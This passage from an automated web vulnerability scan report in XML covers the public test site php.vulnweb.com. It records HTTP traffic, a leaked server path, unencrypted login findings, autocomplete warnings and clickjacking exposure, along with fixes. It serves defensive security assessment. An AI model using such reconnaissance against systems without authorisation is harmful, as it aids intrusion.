/></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
To verify the issue, click the 'HTTP Response' button on the properties view and review the highlighted areas to determine the Unix path found.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />

Don't display fully qualified pathnames as part of error or informational messages.  At the least, fully qualified pathnames can provide an attacker with important information about the architecture of web application.  <br /><br /><b>For Security Operations: </b><br /><br />

The following recommendations will help to ensure that a potential attacker is not deriving valuable information from any error message that is presented. 

<ul><li><b>Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For  
instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks  
actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><br /><br /><li><b>Informational Error Messages: </b>
Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and  
column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as  
possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><br /><br /><li><b>Proper Error Handling: </b>Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or  
other data that could be utilized by an attacker when orchestrating an attack. </li></ul><b>For QA:</b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to  
cause internal errors to gauge the reaction of the site.<br /><br />

The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file  
that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker? It is  
often a seemingly innocuous piece of information that provides an attacker with the means to discover something else which he can then utilize when  
conducting an attack.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="A19962DA6C0E82DFC2D5D2B40FF01C50"><![CDATA[GET /AJAX/infocateg.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/infocateg.php?id=4
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="A19962DA6C0E82DFC2D5D2B40FF01C50";PSID="1EF73D22016229B907A53AA2C61E2FB8";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="58";tt="11";
X-RequestManager-Memo: sid="35";smi="0";sc="1";ID="f5e8d92d";
X-Request-Memo: ID="ee97939f";sc="1";tid="43";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:47:40 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 145

<iteminfo>
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/AJAX/infocateg.php on line 7
</iteminfo>]]></RawResponse><Request id="A19962DA6C0E82DFC2D5D2B40FF01C50"><Method>GET</Method><Path>/AJAX/</Path><File>infocateg</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/infocateg.php?id=4</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="A19962DA6C0E82DFC2D5D2B40FF01C50";PSID="1EF73D22016229B907A53AA2C61E2FB8";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="58";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="35";smi="0";sc="1";ID="f5e8d92d";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="ee97939f";sc="1";tid="43";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo>
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/AJAX/infocateg.php on line 7
</iteminfo>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:47:40 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>145</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="272422C3BECDF90C3929A5DA3994D1AC"><URL>http://php.vulnweb.com:80/AJAX/infocateg.php?id=2</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="272422C3BECDF90C3929A5DA3994D1AC"><![CDATA[GET /AJAX/infocateg.php?id=2 HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="272422C3BECDF90C3929A5DA3994D1AC";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="a700b3a3";
X-Request-Memo: ID="0a11f60b";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:34 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 325

<iteminfo><name>Paintings</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</description></iteminfo>]]></RawResponse><Request id="272422C3BECDF90C3929A5DA3994D1AC"><Method>GET</Method><Path>/AJAX/</Path><File>infocateg</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>id=2</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>id</Name><Value>2</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="272422C3BECDF90C3929A5DA3994D1AC";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="a700b3a3";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="0a11f60b";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo><name>Paintings</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</description></iteminfo>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:34 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>325</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="FB92768C75D0DC1076D2DC87A6E45F2F"><URL>http://php.vulnweb.com:80/login.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="6f327a16-afcb-42a1-bd12-ab5214fd8389"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11542</EngineType><AttackHTTPRequest /><VulnerabilityID>4722</VulnerabilityID><Severity>3</Severity><Name>Logins Sent Over Unencrypted Connection</Name><Classifications><Classification kind="CWE" identifier="CWE-319" href="http://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Insecure Transport" href="https://vulncat.fortify.com/">Insecure Transport</Classification></Classifications><DetectionSelection><Location offset="2458" length="12" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Any area of a web application that possibly contains sensitive information or access to privileged functionality such as remote site administration functionality should utilize SSL or another form of encryption to prevent login information from being sniffed or otherwise intercepted or stolen.   ~FullURL~ has failed this policy. Recommendations include ensuring that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />An attacker who exploited this design vulnerability would be able to utilize the information to escalate their method of attack,  possibly leading to impersonation of a legitimate user, the theft of proprietary data, or execution of actions not intended by the application developers.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations:</b><br />Ensure that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted.
<br /><br /><b>For Development:</b><br />Ensure that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted.
<br /><br /><b>For QA:</b><br />Test the application not only from the perspective of a normal user, but also from the perspective of a malicious one.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Any area of a web application that possibly contains sensitive information or access to privileged functionality such as remote site administration functionality should utilize SSL or another form of encryption to prevent login information from being sniffed or otherwise intercepted or stolen.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[An attacker who exploited this design vulnerability would be able to utilize the information to escalate their method of attack, possibly leading to impersonation of a legitimate user, obtaining proprietary data, or simply executing actions not intended by the application developers.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[If your site does not encrypt login information, it could very easily be intercepted by an attacker.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Ensure that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted. To ensure that the forms authentication cookie is only transmitted over SSL, you can set the following attribute in the appropriate web.config files:<br /><br />
&lt;configuration&gt;<br />
  &lt;system.web&gt;<br />
    &lt;authentication mode="Forms"&gt;<br />
      &lt;forms requireSSL="true" ...&gt;<br />
  &lt;/system.web&gt;<br />
&lt;/configuration&gt;<br /><br />
Since the ASP.NET Development Server does not support SSL, you should set this in the web.config which is deployed to IIS only, and test it there. Microsoft released a tool to automate (among other things) altering web.config settings for deployment. Search for <a href="”http://msdn.microsoft.com/asp.net/reference/infrastructure/wdp/">Visual Studio 2005 Web Deployment Projects </a> on the Microsoft site. It is a free download that integrates with Visual Studio.<br /><br />
Naturally, you must have SSL configured properly on your web server. You must also make sure that links within the authenticated portions of your website do not use “http://” in the URL, or the user will lose functionality. (When they click such links, the authentication cookie will not be transmitted, and the web site will treat them as an anonymous user again).Consult the MSDN article <a href="”http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnpag2/html/paght000012.asp">How To: Protect Forms Authentication in ASP.NET2.0 </a> for more details.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />Ensure that sensitive areas of your Web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted. <br /><br />
You must have SSL configured properly on your Web server. You must also make sure that links within the authenticated portions of your Website do not use “http://” in the URL, or the user will lose functionality. When users click such links, the authentication cookie will not be transmitted, and the Website will treat them as anonymous users again. <br /><br />
Each Web server has its own mechanism to set up SSL. Refer to the documentation for your Web server to find out how to configure SSL.]]></SectionText></ReportSection></Issue><Issue id="27ca0f78-e108-4b3c-b7b4-abe1b63b4de2"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="2544" length="63" /><Location offset="3285" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue><Issue id="47759f43-a4da-42f0-896c-67374cf07097"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11542</EngineType><AttackHTTPRequest /><VulnerabilityID>10595</VulnerabilityID><Severity>3</Severity><Name>Unencrypted Login Form</Name><Classifications><Classification kind="7PK" identifier="API Abuse" href="https://vulncat.fortify.com/">API Abuse</Classification><Classification kind="7PK Category" identifier="Often Misused: Login" href="https://vulncat.fortify.com/">Often Misused: Login</Classification><Classification kind="CWE" identifier="CWE-311" href="http://cwe.mitre.org/data/definitions/311.html">CWE-311: Missing Encryption of Sensitive Data</Classification></Classifications><DetectionSelection><Location offset="2458" length="12" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[An unencrypted login form has been discovered. Any area of a web application that possibly contains sensitive information or access to privileged functionality such as remote site administration functionality should utilize SSL or another form of encryption to prevent login information from being sniffed or otherwise intercepted or stolen. If the login form is being served over SSL, the page that the form is being submitted to MUST be accessed over SSL.  Every link/URL present on that page (not just the form action) needs to be served over HTTPS. This will prevent Man-in-the-Middle attacks on the login form. Recommendations include ensuring that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />An attacker who exploited this design vulnerability would be able to utilize the information to escalate their method of attack,  possibly leading to impersonation of a legitimate user, the theft of proprietary data, or execution of actions not intended by the application developers.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Ensure that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Advisory:</b><a href="http://www.kb.cert.org/vuls/id/466433">http://www.kb.cert.org/vuls/id/466433</a><br />]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Any area of a web application that possibly contains sensitive information or access to privileged functionality such as remote site administration functionality should utilize SSL or another form of encryption to prevent login information from being sniffed or otherwise intercepted or stolen. A page containing a login form should be SSL as well as the Action of the form. This will prevent Man-in-the-Middle attacks on the login form.
<br /><br />
~FullURL~ has failed this policy. Recommendations include ensuring that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[An attacker who exploited this design vulnerability would be able to utilize the information to escalate their method of attack, possibly leading to impersonation of a legitimate user, obtaining proprietary data, or simply executing actions not intended by the application developers.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[If your site does not encrypt login information, it could very easily be intercepted by an attacker.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Ensure that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted. To ensure that the forms authentication cookie is only transmitted over SSL, you can set the following attribute in the appropriate web.config files:<br /><br />
&lt;configuration&gt;<br />
  &lt;system.web&gt;<br />
    &lt;authentication mode="Forms"&gt;<br />
      &lt;forms requireSSL="true" ...&gt;<br />
  &lt;/system.web&gt;<br />
&lt;/configuration&gt;<br /><br />
Since the ASP.NET Development Server does not support SSL, you should set this in the web.config which is deployed to IIS only, and test it there. Microsoft released a tool to automate (among other things) altering web.config settings for deployment. Search for <a href="”http://msdn.microsoft.com/asp.net/reference/infrastructure/wdp/">Visual Studio 2005 Web Deployment Projects </a> on the Microsoft site. It is a free download that integrates with Visual Studio.<br /><br />
Naturally, you must have SSL configured properly on your web server. You must also make sure that links within the authenticated portions of your website do not use “http://” in the URL, or the user will lose functionality. (When they click such links, the authentication cookie will not be transmitted, and the web site will treat them as an anonymous user again).Consult the MSDN article <a href="”http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnpag2/html/paght000012.asp">How To: Protect Forms Authentication in ASP.NET2.0 </a> for more details.]]></SectionText></ReportSection></Issue><Issue id="2d1c8d7b-a0da-4779-a7d0-5faacf299211"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>11276</VulnerabilityID><Severity>1</Severity><Name>Password Field Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="2648" length="66" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save password field content entered by users and then automatically complete password entry the next time the field are encountered. This feature is enabled by default and could leak password since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your password fields.<br /><br />

Please Note: Recent versions of most browsers, as noted below, now ignore the autocomplete="off" attribute for password fields in html forms.  Users are allowed to decide the password policy at their own discretion using the password manager.  Although setting is ineffective on these versions of browsers, it would continue to protect website users of earlier versions of these and other browsers that support this attribute. <br /><br />

Browsers NOT Supporting autocomplete="off": <br /><br /><ol><li>Internet Explorer version 11 or above</li><li>Firefox version 30 or above</li><li>Chrome version 34 or above</li><li>For other browsers, please refer to vendor specific documentation</li></ol>]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br /> When autocomplete is enabled, hackers can directly steal your password from local storage.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />To verify if a password filed is vulnerable, first make sure to enable the autocomplete in your browser's settings, and then input the other fileds of the form to see whether the password is automatically filled. If yes, then it's vulnerable, otherwise, not. You may need to do it twice in case it is the first time you type in the credential in your browser.<br /><br />
Please Note:  That some modern browsers no longer support this attribute as summarized above. Verification should be done using a browser that supports this attribute.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />

From the web application perspective, the autocomplete can be turned at the form level or individual entry level by defining the attribute AUTOCOMPLETE="off".]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue><Issue id="8dd7fe54-07ec-4c22-8014-1b1bc4a7eede"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11548</EngineType><AttackHTTPRequest><![CDATA[GET /login.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="FB92768C75D0DC1076D2DC87A6E45F2F";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="a2e0cdd1";
X-Request-Memo: ID="c0f05802";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>11293</VulnerabilityID><Severity>3</Severity><Name>Missing Cross-Frame Scripting Protection</Name><Classifications><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Cross-Frame Scripting" href="https://vulncat.fortify.com/">Cross-Frame Scripting</Classification><Classification kind="CWE" identifier="CWE-1021" href="https://cwe.mitre.org/data/definitions/1021.html">CWE-1021: Improper Restriction of Rendered UI Layers or Frames</Classification></Classifications><ReportSection><Name>Summary</Name><SectionText><![CDATA[<br />A Cross-Frame Scripting (XFS) vulnerability can allow an attacker to load the vulnerable application inside an HTML iframe tag on a malicious page. The attacker could use this weakness to devise a Clickjacking attack to conduct phishing, frame sniffing, social engineering or Cross-Site Request Forgery attacks.
<br /><br /><b>Clickjacking</b><br />
The goal of a Clickjacking attack is to deceive the victim (user) into interacting with UI elements of the attacker’s choice on the target web site without their knowledge and then executing privileged functionality on the victim’s behalf. To achieve this goal, the attacker must exploit the XFS vulnerability to load the attack target inside an iframe tag, hide it using Cascading Style Sheets (CSS) and overlay the phishing content on the malicious page. By placing the UI elements on the phishing page so they overlap with those on the page targeted in the attack, the attacker can ensure that the victim must interact with the UI elements on the target page not visible to the victim.<br /><br />
WebInspect has detected a page which potentially handles sensitive information using an HTML form with a password input field and is missing XFS protection. <br /><i><drc_xfsprotection /></i>]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />A Cross-Frame Scripting weakness could allow an attacker to embed the vulnerable application inside an iframe. Exploitation of this weakness could result in:<ol><li>Hijacking of user events such as keystrokes</li><li>Theft of sensitive information</li><li>Execution of privileged functionality through combination with Cross-Site Request Forgery attacks</li></ol>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Create a test page containing an HTML <font face="courier new"> iframe </font> tag whose <font face="courier new">src</font> attribute is set to ~FullURL~. Successful framing of the target page indicates that the application is susceptibile to XFS. <br /><br />Note that WebInspect will report only one instance of this check across each host within the scope of the scan. The other visible pages on the site may, however, be vulnerable to XFS as well and therefore should be protected against it with an appropriate fix.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />The Content Security Policy (CSP) <font face="courier new">frame-ancestors</font> directive obsoletes the <font face="courier new">X-Frame-Options</font> header. Both provide for a policy-based mitigation technique against cross-frame scripting vulnerabilities.  The difference is that while the <font face="courier new">X-Frame-Options</font> technique only checks against the top-level document’s location, the CSP <font face="courier new">frame-ancestors</font> header checks for conformity from all ancestors. <br /><br />
If both CSP <font face="courier new">frame-ancestors</font> and <font face="courier new">X-Frame-Options</font> headers are present and supported, the CSP directive will prevail. WebInspect recommends using both CSP <font face="courier new">frame-ancestors</font> and <font face="courier new">X-Frame-Options</font> headers as CSP is not supported by Internet Explorer and many older versions of other browsers. <br /><br />
In addition, developers must also use client-side frame busting JavaScript as a protection against XFS. This will enable users of older browsers that do not support the <font face="courier new">X-Frame-Options</font> header to also be protected from Clickjacking attacks.<br /><br /><b>X-Frame-Options</b><br />Developers can use this header to instruct the browser about appropriate actions to perform if their site is included inside an <font face="courier new">iframe</font>.<brr />
Developers must set the <font face="courier new">X-Frame-Options</font> header to one of the following permitted values:
<ul><li>DENY<br />
Deny all attempts to frame the page </li><li>SAMEORIGIN<br />
The page can be framed by another page only if it belongs to the same origin as the page being framed</li><li>ALLOW-FROM origin<br />
Developers can specify a list of trusted origins in the origin attribute. Only pages on origin are permitted to load this page inside an <font face="courier new">iframe</font></li></ul><br /><b>Content-Security-Policy: <font face="courier new">frame-ancestors</font></b><br />Developers can use the CSP header with the <font face="courier new">frame-ancestors</font> directive, which replaces the <font face="courier new">X-Frame-Options</font> header, to instruct the browser about appropriate actions to perform if their site is included inside an iframe. Developers can set the frame-ancestors attribute to one of the following permitted values:
<ul><li>
